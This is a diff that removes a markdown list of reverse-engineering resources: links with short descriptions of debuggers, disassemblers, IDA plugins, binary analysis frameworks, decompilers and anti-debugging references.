-	* [Detecting programming language from a snippet](https://stackoverflow.com/questions/475033/detecting-programming-language-from-a-snippet)
-* Comparison Tools
-	* [binwally](https://github.com/bmaia/binwally)
-		* Binary and Directory tree comparison tool using the Fuzzy Hashing concept (ssdeep)
-	* [Using binwally - a directory tree diff tool](http://w00tsec.blogspot.com/2013/12/binwally-directory-tree-diff-tool-using.html)
-* References
-	* [FCC ID Lookup](http://transition.fcc.gov/oet/ea/fccid/)
-		* Lookup devices according to FCC ID
-	* [x86 opcode structure and instruction overview](http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.pdf)
-
-
---------------
-### <a name="general">General Research/Stuff</a>
-* [TAMPER (Tamper And Monitoring Protection Engineering Research)](http://www.cl.cam.ac.uk/research/security/tamper/)
-	* In the TAMPER Lab, we study existing security products, document how they have been penetrated in the past, develop new attack techniques, and try to forecast how newly available technologies will make it easier to bypass hardware security mechanisms. We then develop and evaluate new countermeasures and assist industrial designers in staying ahead of the game, most of all by giving them an advanced understanding of which attack techniques are most dangerous. We are especially interested in protection systems for mass-market applications, and in forensic applications. 
-
-
-
-
-
-
-
-
---------------
-### <a name="tools">Tools</a>
-* Binary Visualization Tools
-	* [binglide](https://github.com/wapiflapi/binglide)
-		* binglide is a visual reverse engineering tool. It is designed to offer a quick overview of the different data types that are present in a file. This tool does not know about any particular file format, everything is done using the same analysis working on the data. This means it works even if headers are missing or corrupted or if the file format is unknown.
-	* [binvis.io](http://binvis.io/#/)
-		* visual analysis of binary files
-	* [cantor.dust](https://sites.google.com/site/xxcantorxdustxx/home)
-		* a powerful, dynamic, interactive binary visualization tool
-* General
-	* [Binwalk](https://github.com/devttys0/binwalk)
-		* Binwalk is a fast, easy to use tool for analyzing, reverse engineering, and extracting firmware images.
-	* [Pip3line, the Swiss army knife of byte manipulation](https://nccgroup.github.io/pip3line/index.html) 
-		* Pip3line is a raw bytes manipulation utility, able to apply well known and less well known transformations from anywhere to anywhere (almost).
-	* [Frida](http://www.frida.re/docs/home/)
-		* Inject JS into native apps
-	* [Binacle](https://github.com/ANSSI-FR/Binacle)
-		* Indexation "full-bin" of binary files
-	* [Construct2](https://github.com/construct/construct)
-		* Construct is a powerful declarative parser (and builder) for binary data. Instead of writing imperative code to parse a piece of data, you declaratively define a data structure that describes your data. As this data structure is not code, you can use it in one direction to parse data into Pythonic objects, and in the other direction, convert ("build") objects into binary data.
-* De/Obfuscators/Unpackers
-	* [de4dot](https://github.com/0xd4d/de4dot)
-		* de4dot is an open source (GPLv3) .NET deobfuscator and unpacker written in C#. It will try its best to restore a packed and obfuscated assembly to almost the original assembly. Most of the obfuscation can be completely restored (eg. string encryption), but symbol renaming is impossible to restore since the original names aren't (usually) part of the obfuscated assembly.
-	* [Universal Extractor](http://www.legroom.net/software/uniextract)
-		* Universal Extractor is a program designed to decompress and extract files from any type of archive or installer, such as ZIP or RAR files, self-extracting EXE files, application installers, etc
-	* [Stunnix C/C++ Obfuscator](http://stunnix.com/prod/cxxo/)
-	* [asar](https://github.com/electron/asar)
-		* Simple extensive tar-like archive format with indexing
-* ELF/Related Tools
-	* [Rdis](https://github.com/endeav0r/rdis)
-		* Rdis is a Binary Analysis Tool for Linux.
-	* [readelf](https://sourceware.org/binutils/docs/binutils/readelf.html)
-		* Unix Tool
-* Emulators
-	* [Unicorn-Engine](http://www.unicorn-engine.org/)
-		* Unicorn is a lightweight multi-platform, multi-architecture CPU emulator framework.
-	* [pegasus - Windbg extension DLL for emulation](https://github.com/0a777h/pegasus)
-		* Windbg emulation plugin 
-* PE32/Related Tools
-	* [Dependency Walker](http://www.dependencywalker.com/)
-		* Dependency Walker is a free utility that scans any 32-bit or 64-bit Windows module (exe, dll, ocx, sys, etc.) and builds a hierarchical tree diagram of all dependent modules. For each module found, it lists all the functions that are exported by that module, and which of those functions are actually being called by other modules. Another view displays the minimum set of required files, along with detailed information about each file including a full path to the file, base address, version numbers, machine type, debug information, and more.
-	* [PPEE(puppy)](https://www.mzrst.com/#top)
-		* Professional PE file Explorer for reversers, malware researchers and those who want to statically inspect PE files in more details. Free and fast.
-	* [PEStudio](http://www.winitor.com/)
-		* pestudio is a tool that performs the static analysis of 32-bit and 64-bit Windows executable files.  Malicious executable attempts to hide its malicious intents and to evade detection. In doing so, it generally presents anomalies and suspicious patterns. The goal of pestudio is to detect these anomalies, provide indicators and score the executable being analyzed. Since the executable file being analyzed is never started, you can inspect any unknown or malicious executable with no risk. 
-	* [PEview](http://wjradburn.com/software/)
-		* PEview provides a quick and easy way to view the structure and content of 32-bit Portable Executable (PE) and Component Object File Format (COFF) files. This PE/COFF file viewer displays header, section, directory, import table, export table, and resource information within EXE, DLL, OBJ, LIB, DBG, and other file types.
-* OLE
-	* [python-oletools](https://github.com/decalage2/oletools)
-		* python-oletools is a package of python tools to analyze Microsoft OLE2 files (also called Structured Storage, Compound File Binary Format or Compound Document File Format), such as Microsoft Office documents or Outlook messages, mainly for malware analysis, forensics and debugging. It is based on the olefile parser. See http://www.decalage.info/python/oletools for more info.
-* Searching Through Binaries
- 	* [bingrep](https://github.com/m4b/bingrep)
-		* Greps through binaries from various OSs and architectures, and colors them. 
-* Static Analysis Tools
-	* [Bindead - static binary binary analysis tool](https://bitbucket.org/mihaila/bindead/wiki/Home)
-		* Bindead is an analyzer for executable machine code. It features a disassembler that translates machine code bits into an assembler like language (RREIL) that in turn is then analyzed by the static analysis component using abstract interpretation. 
-	* [Static binary analysis tool](https://github.com/bdcht/amoco)
-		* Amoco is a python package dedicated to the (static) analysis of binaries. Worth a check on the Github
-	* [Statically Linked Library Detector](https://github.com/arvinddoraiswamy/slid)
-* OS X
-	* [Instruments - OS X system analysis](https://developer.apple.com/library/mac/documentation/DeveloperTools/Conceptual/InstrumentsUserGuide/Introduction/Introduction.html)
-		* Instruments is a performance-analysis and testing tool for dynamically tracing and profiling OS X and iOS code. It is a flexible and powerful tool that lets you track a process, collect data, and examine the collected data. In this way, Instruments helps you understand the behavior of both user apps and the operating system.
-	* [Reversing iOS/OS X](http://newosxbook.com/forum/viewforum.php?f=8)
-* Linux
-	* [Statically Linked Library Detector](https://github.com/arvinddoraiswamy/slid)
-	* [Rdis](https://github.com/endeav0r/rdis)
-		* Rdis is a Binary Analysis Tool for Linux.
-* Windows
-	* [PolyHook - x86/x64 Hooking Library](https://github.com/stevemk14ebr/PolyHook)
-		* Provides abstract C++ 11 interface for various hooking methods
-	* [EasyHook](https://easyhook.github.io/)
-		* EasyHook makes it possible to extend (via hooking) unmanaged code APIs with pure managed functions, from within a fully managed environment on 32- or 64-bit Windows XP SP2, Windows Vista x64, Windows Server 2008 x64, Windows 7, Windows 8.1, and Windows 10.
-	* [Microsoft Message Analyzer](http://www.microsoft.com/en-us/download/details.aspx?id=40308)
-		* Microsoft Message Analyzer is a new tool for capturing, displaying, and analyzing protocol messaging traffic and other system messages. Message Analyzer also enables you to import, aggregate, and analyze data from log and trace files. It is the successor to Microsoft Network Monitor 3.4 and a key component in the Protocol Engineering Framework (PEF) that was created by Microsoft for the improvement of protocol design, development, documentation, testing, and support. With Message Analyzer, you can choose to capture data live or load archived message collections from multiple data sources simultaneously.
-	* [API Monitor](http://www.rohitab.com/apimonitor)
-		* API Monitor is a free software that lets you monitor and control API calls made by applications and services. Its a powerful tool for seeing how applications and services work or for tracking down problems that you have in your own applications.
-	* [SpyStudio](http://www.nektra.com/products/spystudio-api-monitor/)
-		* SpyStudio shows and interprets calls, displaying the results in a structured way which is easy for any IT professional to understand. SpyStudio can show registry keys and files that an application uses, COM objects and Windows the application has created, and errors and exceptions.
-		* [SpyStudio Tutorials](http://whiteboard.nektra.com/spystudio-2-0-quickstart)
-	* [Fibratus](https://github.com/rabbitstack/fibratus)
-		* Fibratus is a tool which is able to capture the most of the Windows kernel activity - process/thread creation and termination, file system I/O, registry, network activity, DLL loading/unloading and much more. Fibratus has a very simple CLI which encapsulates the machinery to start the kernel event stream collector, set kernel event filters or run the lightweight Python modules called filaments. You can use filaments to extend Fibratus with your own arsenal of tools.
-	* [Deviare2](https://github.com/nektra/Deviare2)
-		* Deviare is a professional hooking engine for instrumenting arbitrary Win32 functions, COM objects, and functions whose symbols are located in program databases (PDBs). It can intercept unmanaged code in 32-bit and 64-bit applications. It is implemented as a COM component, so it can be integrated with all the programming languages which support COM, such as C/C++, VB, C#, Delphi, and Python.
-	* [Deviare In-Proc](https://github.com/nektra/Deviare-InProc)
-		* Deviare In-Proc is a code interception engine for Microsoft Windows® developed by Nektra Advanced Computing. This library is at the core of our Deviare v2.0 and SpyStudio Application Monitor technologies. Deviare is an alternative to Microsoft Detours® but with a dual license distribution. The library is coded in C++ and provides all the facilities required to instrument binary libraries during runtime. It includes support for both 32 and 64 bit applications and it implements the interception verifying different situations that can crash the process. If you need to intercept any Win32 functions or any other code, this library makes it easier than ever. Unlike the rest of the libraries, Deviare In-Proc provides a safe mechanism to implement multi-threaded application API hooking. When an application is running, more than one thread can be executing the code being intercepted. Deviare In-Proc provides safe hooking even in this scenario.		
-
-
-
-
---------------
-#### <a name="dbg">Debuggers</a> Lldb edb
-Debuggers
-* All platforms
-	* [Voltron](https://github.com/snare/voltron)
-		* Voltron is an extensible debugger UI toolkit written in Python. It aims to improve the user experience of various debuggers (LLDB, GDB, VDB and WinDbg) by enabling the attachment of utility views that can retrieve and display data from the debugger host. By running these views in other TTYs, you can build a customised debugger user interface to suit your needs.
-	* [GDB - GNU Debugger](https://www.gnu.org/software/gdb/)
-		* GDB, the GNU Project debugger, allows you to see what is going on `inside' another program while it executes -- or what another program was doing at the moment it crashed. 
-	* GDB Addons
-		* [PEDA](https://github.com/longld/peda)
-			* PEDA - Python Exploit Development Assistance for GDB 		
-		* [gdbgui](https://github.com/cs01/gdbgui)
-			* A modern, browser-based frontend to gdb (gnu debugger). Add breakpoints, view stack traces, and more in C, C++, Go, and Rust. Simply run gdbgui from the terminal and a new tab will open in your browser.
-		* [GEF - GDB Enhanced Features](https://github.com/hugsy/gef)
-			* GEF is aimed to be used mostly by exploiters and reverse-engineers. It provides additional features to GDB using the Python API to assist during the process of dynamic analysis or exploit development. Why not PEDA? Yes!! Why not?! PEDA is a fantastic tool to do the same, but is only to be used for x86-32 or x86-64. On the other hand, GEF supports all the architecture supported by GDB (x86, ARM, MIPS, PowerPC, SPARC, and so on).
-			* [Docs](https://gef.readthedocs.org/en/latest/)
-* Linux
-	* [PulseDBG](https://github.com/honorarybot/PulseDBG)
-		* Hypervisor-based debugger
-	* [xnippet](https://github.com/isislab/xnippet)
-		* xnippet is a tool that lets you load code snippets or isolated functions (no matter the operating system they came from), pass parameters to it in several formats (signed decimal, string, unsigned hexadecimal...), hook other functions called by the snippet and analyze the result. The tool is written in a way that will let me improve it in a future, defining new calling conventions and output argument pointers.
-* OS X	
-* Windows
-	* [OllyDbg](http://www.ollydbg.de/)
-		* OllyDbg is a 32-bit assembler level analysing debugger for Microsoft® Windows®. Emphasis on binary code analysis makes it particularly useful in cases where source is unavailable.
-		* [OllyDbg Tricks for Exploit Development](http://resources.infosecinstitute.com/in-depth-seh-exploit-writing-tutorial-using-ollydbg/)
-	* [WinDbg](https://msdn.microsoft.com/en-us/library/windows/hardware/ff551063%28v=vs.85%29.aspx)
-		* [Excellent Resource Site](http://www.windbg.org/)
-		* [Crash Dump Analysis Poster](http://www.dumpanalysis.org/CDAPoster.html)
-		* [Getting Started with WinDbg (User-Mode)](https://msdn.microsoft.com/en-us/library/windows/hardware/dn745911%28v=vs.85%29.aspx)
-		* [Getting Started with WinDbg (Kernel-Mode)](https://msdn.microsoft.com/en-us/library/windows/hardware/dn745912%28v=vs.85%29.aspx)
-		* [REhints MEX - WinDBG addons](https://github.com/REhints/WinDbg/tree/master/MEX)
-	* [WinAppDbg](http://winappdbg.sourceforge.net/)
-		* The WinAppDbg python module allows developers to quickly code instrumentation scripts in Python under a Windows environment.  It uses ctypes to wrap many Win32 API calls related to debugging, and provides a powerful abstraction layer to manipulate threads, libraries and processes, attach your script as a debugger, trace execution, hook API calls, handle events in your debugee and set breakpoints of different kinds (code, hardware and memory). Additionally it has no native code at all, making it easier to maintain or modify than other debuggers on Windows.  The intended audience are QA engineers and software security auditors wishing to test or fuzz Windows applications with quickly coded Python scripts. Several ready to use tools are shipped and can be used for this purposes.  Current features also include disassembling x86/x64 native code, debugging multiple processes simultaneously and produce a detailed log of application crashes, useful for fuzzing and automated testing.
-	* [Open Source Windows x86/x64 Debugger](http://x64dbg.com/)
-	* [HyperDbg](https://github.com/rmusser01/hyperdbg/)
-		* HyperDbg is a kernel debugger that leverages hardware-assisted virtualization. More precisely, HyperDbg is based on a minimalistic hypervisor that is installed while the system runs. Compared to traditional kernel debuggers (e.g., WinDbg, SoftIce, Rasta R0 Debugger) HyperDbg is completely transparent to the kernel and can be used to debug kernel code without the need of serial (or USB) cables. For example, HyperDbg allows to single step the execution of the kernel, even when the kernel is executing exception and interrupt handlers. Compared to traditional virtual machine based debuggers (e.g., the VMware builtin debugger), HyperDbg does not require the kernel to be run as a guest of a virtual machine, although it is as powerful. 
-		* [Paper](http://roberto.greyhats.it/pubs/ase10.pdf)
-* Debugging Writeups/Papers
-	* [BugNet: Continuously Recording Program Execution for Deterministic Replay Debugging](https://cseweb.ucsd.edu/~calder/papers/ISCA-05-BugNet.pdf)
-	* [Back to the Future: Omniscient Debugging](https://pleiad.cl/papers/2009/pothierTanter-software2009.pdf) 
-	* [A REVIEW OF REVERSE DEBUGGING - Jakob Engblom (2012?)](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.338.3420&rep=rep1&type=pdf)
-	* [Binary Hooking Problems](http://www.ragestorm.net/blogs/?p=348)
-	* [Hyper-V debugging for beginners](http://hvinternals.blogspot.com/2015/10/hyper-v-debugging-for-beginners.html?m=1)
-
-
-
-
-
-
---------------
-#### <a name="decom">Decompilers & Disassemblers</a>
-Decompilers & Disassemblers
-* Decompilers & Disassemblers
-	* Java
-		* [Procyon - Java Decompiler](https://bitbucket.org/mstrobel/procyon/wiki/Java%20Decompiler)
-	* General
-		* [IDA](https://www.hex-rays.com/products/ida/)
-			* IDA Pro combines an interactive, programmable, multi-processor disassembler coupled to a local and remote debugger and augmented by a complete plugin programming environment.
-			* [Overview & Tutorials](https://www.hex-rays.com/products/ida/debugger/index.shtml)
-		* [fREedom](capstone based disassembler for extracting to binnavi )
-			* fREedom is a primitive attempt to provide an IDA Pro independent means of extracting disassembly information from executables for use with binnavi (https://github.com/google/binnavi).
-		* [Hopper](http://www.hopperapp.com/)
-			* Hopper is a reverse engineering tool for OS X and Linux, that lets you disassemble, decompile and debug your 32/64bits Intel Mac, Linux, Windows and iOS executables!
-		* [Reverse](https://github.com/joelpx/reverse)
-			* Reverse engineering for x86 binaries (elf-format). Generate a more readable code (pseudo-C) with colored syntax. Warning, the project is still in development, use it at your own risks. This tool will try to disassemble one function (by default main). The address of the function, or its symbol, can be passed by argument.
-		* [Medusa](https://github.com/wisk/medusa)
-			* Medusa is a disassembler designed to be both modular and interactive. It runs on Windows and Linux, it should be the same on OSX. This project is organized as a library. To disassemble a file you have to use medusa_dummy or qMedusa. wxMedusa and pydusa are not available anymore.
-	* .NET
-		* [DotPeek](http://www.jetbrains.com/decompiler/features/)
-			* dotPeek is a .NET decompiler that has several handy features.
-	* IDA specific Stuff
-		* IDA Extensions
-			* [BAP-IDA](https://github.com/BinaryAnalysisPlatform/bap-ida-python)
-				* This package provides the necessary IDAPython scripts required for interoperatibility between BAP and IDA Pro. It also provides many useful feature additions to IDA, by leveraging power from BAP.
-			* [funcap - IDA Pro script to add some useful runtime info to static analysis.](https://github.com/deresz/funcap)
-				* This script records function calls (and returns) across an executable using IDA debugger API, along with all the arguments passed. It dumps the info to a text file, and also inserts it into IDA's inline comments. This way, static analysis that usually follows the behavioral runtime analysis when analyzing malware, can be directly fed with runtime info such as decrypted strings returned in function's arguments. In author's opinion this allows to understand the program's logic way faster than starting the "zero-knowledge" reversing. Quick understanding of a malware sample code was precisely the motivation to write this script and the author has been using it succesfully at his $DAYJOB. It is best to see the examples with screenshots to see how it works (see below). It must be noted that the script has been designed with many misconceptions, errors and bad design decisions (see issues and funcap.py code) as I was learning when coding but it has one advantage - it kind of works :) Current architectures supported are x86, amd64 and arm.
-			[IDAPython Embedded Toolkit](https://github.com/maddiestone/IDAPythonEmbeddedToolkit)
-				* IDAPython is a way to script different actions in the IDA Pro disassembler with Python. This repository of scripts automates many different processes necessary when analyzing the firmware running on microcontroller and microprocessor CPUs. The scripts are written to be easily modified to run on a variety of architectures. Read the instructions in the header of each script to determine what ought to be modified for each architecture.
-		* IDA Plugins 
-			* [A list of IDA Plugins](https://github.com/onethawt/idaplugins-list)
-			* [IDA Python - Ero Carrera](http://www.offensivecomputing.net/papers/IDAPythonIntro.pdf)
-				* IDAPython is an extension for IDA , the Interactive Disassembler . It brings the power and convenience of Python scripting to aid in the analysis of binaries. This article will cover some basic usage and provide examples to get interested individuals started. W e will walk through practical examples ranging from iterating through functions, segments and instructions to data mining the binaries, collecting references and analyzing their structure.
-			* [Kam1n0-Plugin-IDA-Pro](https://github.com/McGill-DMaS/Kam1n0-Plugin-IDA-Pro)
-				* Kam1n0 is a scalable system that supports assembly code clone search. It allows a user to first index a (large) collection of binaries, and then search for the code clones of a given target function or binary file. Kam1n0 tries to solve the efficient subgraph search problem (i.e. graph isomorphism problem) for assembly functions. Given a target function (the middle one in the figure below) it can identity the cloned subgraphs among other functions in the repository (the ones on the left and the right as shown below). Kam1n0 supports rich comment format and has an IDA Pro plug-in to use its indexing and searching capabilities via IDA Pro. 
-			* [FLARE-Ida](https://github.com/fireeye/flare-ida)
-				* This repository contains a collection of IDA Pro scripts and plugins used by the FireEye Labs Advanced Reverse Engineering (FLARE) team.
-			* [toolbag](https://github.com/aaronportnoy/toolbag)
-				* The IDA Toolbag is a plugin providing supplemental functionality to Hex-Rays IDA Pro disassembler. 
-			* [Dynamic IDA Enrichment (aka. DIE)](https://github.com/ynvb/DIE)
-				* DIE is an IDA python plugin designed to enrich IDA`s static analysis with dynamic data. This is done using the IDA Debugger API, by placing breakpoints in key locations and saving the current system context once those breakpoints are hit.
-			* [HexRaysCodeXplorer](https://github.com/REhints/HexRaysCodeXplorer)
-				* Hex-Rays Decompiler plugin for better code navigation in RE process of C++ applications or code reconstruction of modern malware as Stuxnet, Flame, Equation	
-			* [Ida Pomidor](https://thesprawl.org/projects/ida-pomidor/)
-				* IDA Pomidor is a fun and simple plugin for the Hex-Ray's IDA Pro disassembler that will help you retain concentration and productivity during long reversing sessions.
-			* [idaConsonance](https://github.com/eugeii/ida-consonance)
-				* Consonance, a dark color theme for IDA.
-			* [Lighthouse - Code Coverage Explorer for IDA Pro](https://github.com/gaasedelen/lighthouse)
-				* Lighthouse is a code coverage plugin for IDA Pro. The plugin leverages IDA as a platform to map, explore, and visualize externally collected code coverage data when symbols or source may not be available for a given binary.
-			* [NRS](https://github.com/isra17/nrs)
-				* NRS is a set of Python librairies used to unpack and analysis NSIS installer's data. It also feature an IDA plugin used to disassembly the NSIS Script of an installer
-			* [Ponce](https://github.com/illera88/Ponce)
-				* Ponce (pronounced [ 'poN ?e ] pon-they ) is an IDA Pro plugin that provides users the ability to perform taint analysis and symbolic execution over binaries in an easy and intuitive fashion. With Ponce you are one click away from getting all the power from cutting edge symbolic execution. Entirely written in C/C++.
-			* [IDASkins](https://github.com/zyantific/IDASkins)
-				* Advanced skinning plugin for IDA Pro
-			* [Ida Sploiter](https://thesprawl.org/projects/ida-sploiter/)
-				* IDA Sploiter is a plugin for Hex-Ray's IDA Pro disassembler designed to enhance IDA's capabilities as an exploit development and vulnerability research tool. Some of the plugin's features include a powerful ROP gadgets search engine, semantic gadget analysis and filtering, interactive ROP chain builder, stack pivot analysis, writable function pointer search, cyclic memory pattern generation and offset analysis, detection of bad characters and memory holes, and many others.
-			* [vtbl-ida-pro-plugin](https://github.com/nektra/vtbl-ida-pro-plugin)
-				* Identifying Virtual Table Functions using VTBL IDA Pro Plugin + Deviare Hooking Engine
-			* [virusbattle-ida-plugin](https://github.com/moghimi/virusbattle-ida-plugin)
-				* The plugin is an integration of Virus Battle API to the well known IDA Disassembler. Virusbattle is a web service that analyses malware and other binaries with a variety of advanced static and dynamic analyses.
-		* IDA Tutorials/Help
-			* [TiGa's Video Tutorial Series on IDA Pro](http://woodmann.com/TiGa/idaseries.html)
-			* [IDA PLUG-IN WRITING IN C/C++](http://www.binarypool.com/idapluginwriting/idapw.pdf)
-			* [How to Identify Virtual Table Functions with IDA Pro and the VTBL Plugin](https://www.youtube.com/watch?v=XHW9Akb4KLI&app=desktop)
-			* [Reversing C++ programs with IDA pro and Hex-rays](https://blog.0xbadc0de.be/archives/67)
-			* [IDAPython The Wonder Woman of Embedded Device Reversing Maddie Stone - Derbycon7](https://www.youtube.com/watch?v=HRwfRrmPAHI&index=2&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
-			* [IDA FLIRT In Depth](https://www.hex-rays.com/products/ida/tech/flirt/in_depth.shtml)
-
-
-
-
-
-
---------------
-#### <a name="formats">File Formats</a>
-File Formats
-* [Encyclopedia of Graphics File Formats](http://fileformats.archiveteam.org/wiki/Encyclopedia_of_Graphics_File_Formats)
-* [PE File Format Graphs](http://blog.dkbza.org/2012/08/pe-file-format-graphs.html?view=mosaic)
-* [PNG File Format](http://fileformats.archiveteam.org/wiki/PNG)
-* [Tour of Win32 Executable format](http://msdn.microsoft.com/en-us/magazine/ms809762.aspx)
-
-
---------------
-#### <a name="flash"></a>Flash Player
-* [#Fldbg](https://github.com/offensive-security/fldbg)
-	* #Fldbg, a Pykd script to debug FlashPlayer
-* [SWFRETools](https://github.com/sporst/SWFREtools)
-	* The SWFRETools are a collection of tools built for vulnerability analysis of the Adobe Flash player and for malware analysis of malicious SWF files. The tools are partly written in Java and partly in Python and are licensed under the GPL 2.0 license.
-
-
-
-
---------------
-#### <a name="frameworks"Frameworks</a>
-Frameworks
-* [angr](http://angr.io/)
-	* angr is a python framework for analyzing binaries. It focuses on both static and dynamic symbolic ("concolic") analysis, making it applicable to a variety of tasks.
-* Radare2 - unix-like reverse engineering framework and commandline tools ](http://www.radare.org/y/?p=features)
-	* Informally goal is to be best RE software framework
-	* [Github](https://github.com/radare/radare2)
-	* [Radare2 Book(free)](https://maijin.github.io/radare2book/index.html)
-	* [Radare2 Documentation](http://www.radare.org/y/?p=documentation)
-	* [Reverse engineering embedded software using Radare2 - Talk/Tutorial](https://www.youtube.com/watch?v=R3sGlzXfEkU)
-	* [Notes and Demos for above video](https://github.com/pastcompute/lca2015-radare2-tutorial)
-	* [radare2 cheat sheet](https://github.com/pwntester/cheatsheets/blob/master/radare2.md)
-	* [radare2 as an alternative to gdb-peda](https://monosource.github.io/2016/10/radare2-peda)
-	* [Radare2 in 0x1E minutes](https://blog.techorganic.com/2016/03/08/radare-2-in-0x1e-minutes/)
-* [BitBlaze](http://bitblaze.cs.berkeley.edu/)
-	* The BitBlaze project aims to design and develop a powerful binary analysis platform and employ the platform in order to (1) analyze and develop novel COTS protection and diagnostic mechanisms and (2) analyze, understand, and develop defenses against malicious code. The BitBlaze project also strives to open new application areas of binary analysis, which provides sound and effective solutions to applications beyond software security and malicious code defense, such as protocol reverse engineering and fingerprint generation. 
-* [Platform for Architecture-Neutral Dynamic Analysis](https://github.com/moyix/panda)
-* [BARF-Project](https://github.com/programa-stic/barf-project)
-	* BARF : A multiplatform open source Binary Analysis and Reverse engineering Framework 
-	* [Presentation: Barfing Gadgets - Ekoparty 2014](https://github.com/programa-stic/barf-project/raw/master/documentation/presentations/barfing-gadgets.ekoparty2014.es.pdf)
-
-
-
-
-
---------------
-#### <a name="pl">Programming Language Specifics/Libraries</a>
-Programming Language Specific Stuff/Useful/Related Libraries
-* Libraries
-	* [openreil](https://github.com/Cr4sh/openreil)
-		* Open source library that implements translator and tools for REIL (Reverse Engineering Intermediate Language)]
-	* [PortEx](https://github.com/katjahahn/PortEx)
-		* PortEx is a Java library for static malware analysis of Portable Executable files. Its focus is on PE malformation robustness, and anomaly detection. PortEx is written in Java and Scala, and targeted at Java applications.
-	* [Equip: python bytecode instrumentation](https://github.com/neuroo/equip)
-		* equip is a small library that helps with Python bytecode instrumentation. Its API is designed to be small and flexible to enable a wide range of possible instrumentations. The instrumentation is designed around the injection of bytecode inside the bytecode of the program to be instrumented. However, the developer does not need to know anything about the Python bytecode since the injected code is Python source.
-* GO
-	* [Reversing GO binaries like a pro](https://rednaga.io/2016/09/21/reversing_go_binaries_like_a_pro/)
-* Python 
-	* Bytecode
-		* [Gynvael’s Mission 11 (en): Python bytecode reverse-engineering](https://chriswarrick.com/blog/2017/08/03/gynvaels-mission-11-en-python-bytecode-reverse-engineering/)
-		* [Deobfuscating Python Bytecode](https://www.fireeye.com/blog/threat-research/2016/05/deobfuscating_python.html)
-	* Decompiler
-		* [python-uncompyle6](https://github.com/rocky/python-uncompyle6)
-			* A Python cross-version decompiler
-		* [Decompyle++](https://github.com/zrax/pycdc)
-			* C++ python bytecode disassembler and decompiler
-		* [Python Decompiler](https://github.com/alex/python-decompiler)
-			* This project aims to create a comprehensive decompiler for CPython bytecode (likely works with PyPy as well, and any other Python implementation that uses CPython's bytecode)
-		* [PyInstaller Extractor](https://sourceforge.net/p/pyinstallerextractor/tickets/5/)
-			* Extract contents of a Windows executable file created by pyinstaller 
-		* [Easy Python Decompiler](https://sourceforge.net/projects/easypythondecompiler/)
-			* Python 1.0 - 3.4 bytecode decompiler 
-	* General
-		* [Python RE tools list](http://pythonarsenal.erpscan.com/)	
-
-
-
-----------------------------------------------
-### <a name="are">Anti-Reverse Engineering Techniques & Countermeasures</a>
-Anti-Reverse Engineering Techniques & Countermeasures
-* Talks
-	* [Trolling reverse_engineers with math - frank^2 - part.mov](https://www.youtube.com/watch?v=y124L75ZKAc)
-* Techniques
-	* [The “Ultimate”Anti-Debugging Reference - Peter Ferrie 2011/4](http://pferrie.host22.com/papers/antidebug.pdf)
-	* [Android Reverse Engineering Defenses](https://bluebox.com/wp-content/uploads/2013/05/AndroidREnDefenses201305.pdf)
-	* [Anti-RE A collection of Anti-Reverse Engineering Techniques](http://pnx.tf/files/spring7_antire_plohmann_kannen.pdf)
-	* [Anti Reverse Engineering](http://www.codeproject.com/Articles/30815/An-Anti-Reverse-Engineering-Guide)
-	* [Fun combining anti-debugging and anti-disassembly tricks](http://blog.sevagas.com/?Fun-combining-anti-debugging-and)
-	* [simpliFiRE.AntiRE - An Executable Collection of Anti-Reversing Techniques](https://bitbucket.org/fkie_cd_dare/simplifire.antire)
-		* AntiRE is a collection of such anti analysis approaches, gathered from various sources like Peter Ferrie's The "Ultimate" Anti-Debugging Reference and Ange Albertini's corkami. While these techniques by themselves are nothing new, we believe that the integration of these tests in a single, executable file provides a comprehensive overview on these, suitable for directly studying their behaviour in a harmless context without additional efforts. AntiRE includes different techniques to detect or circumvent debuggers, fool execution tracing, and disable memory dumping. Furthermore, it can detect the presence of different virtualization environments and gives examples of techniques used to twarth static analysis.
-	* [OpenRCE Anti Reverse Engineering Techniques Database](http://www.openrce.org/reference_library/anti_reversing)
-	* [Windows Anti-Debugging Reference](http://www.symantec.com/connect/articles/windows-anti-debug-reference)
-		* This paper classifies and presents several anti-debugging techniques used on Windows NT-based operating systems. Anti-debugging techniques are ways for a program to detect if it runs under control of a debugger. They are used by commercial executable protectors, packers and malicious software, to prevent or slow-down the process of reverse-engineering. We'll suppose the program is analyzed under a ring3 debugger, such as OllyDbg on Windows platforms. The paper is aimed towards reverse-engineers and malware analysts. Note that we will talk purely about generic anti-debugging and anti-tracing techniques. Specific debugger detection, such as window or processes enumeration, registry scanning, etc. will not be addressed here		
-	* [Detecting debuggers by abusing a bad assumption within Windows](http://www.triplefault.io/2017/08/detecting-debuggers-by-abusing-bad.html)
-* Tools
-	* [ALPHA3](https://code.google.com/p/alpha3/)
-		* ALPHA3 is a tool for transforming any x86 machine code into 100% alphanumeric code with similar functionality. It works by encoding the original code into alphanumeric data and combining this data with a decoder, which is a piece of x86 machine code written specifically to be 100% alphanumeric. When run, the decoder converts the data back to the original code, after which it is executed.
-	* [reductio [ad absurdum]](https://github.com/xoreaxeaxeax/reductio)
-		* an exploration of code homeomorphism: all programs can be reduced to the same instruction stream.
-	* [REpsych - Psychological Warfare in Reverse Engineering](https://github.com/xoreaxeaxeax/REpsych/blob/master/README.md)
-		* The REpsych toolset is a proof-of-concept illustrating the generation of images through a program's control flow graph (CFG).
-	* [IDAnt-wanna](https://github.com/strazzere/IDAnt-wanna)
-		* ELF header abuse
-
-
-
-
-
-
-### <a name="hre">Hardware Reverse Engineering</a>
-See 'Embedded Devices & Hardware Hacking'
-
-
-
-
-
-
-### <a name="net"></a>.NET Related
-* [Getting Started with CLR MD](https://github.com/Microsoft/clrmd/blob/master/Documentation/GettingStarted.md)
-* [Microsoft.Diagnostics.Runtime.dll(CLR MD)](https://github.com/Microsoft/clrmd)
-	* Microsoft.Diagnostics.Runtime.dll (nicknamed "CLR MD") is a process and crash dump introspection library. This allows you to write tools and debugger plugins which can do thing similar to SOS and PSSCOR.
-* [Reflexil](https://github.com/sailro/Reflexil)
-	* Reflexil is an assembly editor and runs as a plug-in for Red Gate's Reflector, ILSpy and Telerik's JustDecompile. Reflexil is using Mono.Cecil, written by Jb Evain and is able to manipulate IL code and save the modified assemblies to disk. Reflexil also supports C#/VB.NET code injection
-
-
-
-
-
-
-### <a name="writeups">Writeups</a>
-Writeups(Papers/Videos)
-* 101s
-	* [Defeating ioli with radare2](https://dustri.org/b/defeating-ioli-with-radare2.html)
-* Binary & Code Analysis
